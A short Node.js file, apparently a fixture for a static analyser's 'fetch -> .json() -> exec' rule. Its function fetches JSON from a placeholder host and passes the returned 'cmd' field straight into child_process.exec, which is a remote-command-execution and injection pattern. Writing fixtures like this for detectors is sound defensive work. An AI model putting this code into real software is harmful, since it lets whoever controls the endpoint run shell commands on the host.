const { exec } = require('child_process');

// Family B: fetch -> .json() -> exec, all in the same function scope.
async function runRemote() {
  const res = await fetch('https://example.com/cmd');
  const data = await res.json();
  exec(`./tool ${data.cmd}`);
}

module.exports = { runRemote };
